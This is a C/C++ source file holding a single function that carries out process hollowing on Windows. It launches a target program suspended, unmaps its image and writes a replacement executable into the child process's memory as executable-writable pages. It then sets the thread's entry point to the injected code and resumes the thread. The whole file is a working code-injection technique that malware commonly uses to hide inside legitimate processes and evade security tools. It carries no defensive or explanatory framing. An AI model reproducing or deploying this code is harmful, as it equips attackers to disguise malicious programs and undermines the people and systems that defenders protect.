#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <cstring>

#include "process_hollowing.h"

#pragma comment(lib,"ntdll.lib")

#define EXEC_PATH_LEN 255


EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

int injectProc(std::wstring aWstrProcToInject, std::wstring aWstrTargetProc)
{

	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	wchar_t targetProc[EXEC_PATH_LEN];
	wchar_t replaceProc[EXEC_PATH_LEN];

	//wcsncpy_s is secure version on wcsncpy.
	wcsncpy_s(targetProc, EXEC_PATH_LEN, aWstrTargetProc.c_str(), aWstrTargetProc.length());
	wcsncpy_s(replaceProc, EXEC_PATH_LEN, aWstrProcToInject.c_str(), aWstrProcToInject.length());

	printf("\nRunning the target executable.\n");

	/*
	* Note that CreateProcess must gen non constant process name (2nd param).
	* For this reason, define targetProc as wchar_t array.
	*/
	if (!CreateProcess(NULL, targetProc, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) // Start the target application
	{
		printf("\nError: Unable to run the target executable. CreateProcess failed with error %d\n", GetLastError());
		return GetLastError();
	}
	printf("\nProcess created in suspended state.\n");

	printf("\nOpening the replacement executable.\n");

	// Open the replacement executable
	hFile = CreateFile(replaceProc, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("\nError: Unable to open the replacement executable. CreateFile errno %d\n", GetLastError());

		// We failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1);
		return GetLastError();
	}

	// Get the size of the replacement executable
	nSizeOfFile = GetFileSize(hFile, NULL); 

	// Allocate memory for the executable file
	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Read the executable file from disk
	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) 
	{
		printf("\nError: Unable to read the replacement executable. ReadFile errno:  %d\n", GetLastError());

		// We failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, GetLastError());
		return 1;
	}

	// Close the file handle
	NtClose(hFile); 

	pIDH = (PIMAGE_DOS_HEADER)image;

	// Check for valid executable
	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) 
	{
		printf("\nError: Invalid executable format.\n");

		// We failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1); 
		return 1;
	}

	// Get the address of the IMAGE_NT_HEADERS
	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pIDH->e_lfanew); 

	// Get the thread context of the child process's primary thread
	NtGetContextThread(pi.hThread, &ctx); 

	// Get the PEB address from the ebx register and read the base address of the executable image from the PEB
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL); 

	// If the original image has same base address as the replacement executable,
	// unmap the original executable from the child process.
	if ((DWORD)base == pINH->OptionalHeader.ImageBase) 
	{
		printf("\nUnmapping original executable image from child process. Address: %#x\n", base);
		// Unmap the executable image using NtUnmapViewOfSection function
		NtUnmapViewOfSection(pi.hProcess, base); 
	}

	printf("\nAllocating memory in child process.\n");

	// Allocate memory for the executable image
	mem = VirtualAllocEx(pi.hProcess, 
		                 (PVOID)pINH->OptionalHeader.ImageBase, 
		                 pINH->OptionalHeader.SizeOfImage, 
		                 MEM_COMMIT | MEM_RESERVE, 
		                 PAGE_EXECUTE_READWRITE); 

	if (!mem)
	{
		printf("\nError: Unable to allocate memory in child process. VirtualAllocEx errorno %d\n", GetLastError());

		// We failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1);
		return GetLastError();
	}

	printf("\nMemory allocated. Address: %#x\n", mem);

	printf("\nWriting executable image into child process.\n");

	// Write the header of the replacement executable into child process
	NtWriteVirtualMemory(pi.hProcess, mem, image, pINH->OptionalHeader.SizeOfHeaders, NULL); 

	for (i = 0;i<pINH->FileHeader.NumberOfSections;i++)
	{
		pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		// Write the remaining sections of the replacement executable into child process
		NtWriteVirtualMemory(pi.hProcess, 
			                 (PVOID)((LPBYTE)mem + pISH->VirtualAddress),
			                 (PVOID)((LPBYTE)image + pISH->PointerToRawData), 
			                 pISH->SizeOfRawData,
			                 NULL);
	}

	// Set the eax register to the entry point of the injected image
	ctx.Eax = (DWORD)((LPBYTE)mem + pINH->OptionalHeader.AddressOfEntryPoint);

	printf("\nNew entry point: %#x\n", ctx.Eax);

	// Write the base address of the injected image into the PEB
	NtWriteVirtualMemory(pi.hProcess, 
		                 (PVOID)(ctx.Ebx + 8), 
		                 &pINH->OptionalHeader.ImageBase, 
		                 sizeof(PVOID), 
		                 NULL);

	printf("\nSetting the context of the child process's primary thread.\n");

	// Set the thread context of the child process's primary thread
	NtSetContextThread(pi.hThread, &ctx); 

	printf("\nResuming child process's primary thread.\n");

	// Resume the primary thread
	NtResumeThread(pi.hThread, NULL);

	printf("\nThread resumed.\n");

	printf("\nWaiting for child process to terminate.\n");

	// Wait for the child process to terminate
	NtWaitForSingleObject(pi.hProcess, FALSE, NULL); 

	printf("\nProcess terminated.\n");

	// Close the thread handle
	NtClose(pi.hThread); 

	// Close the process handle
	NtClose(pi.hProcess); 

	// Free the allocated memory
	VirtualFree(image, 0, MEM_RELEASE);
	return 0;
}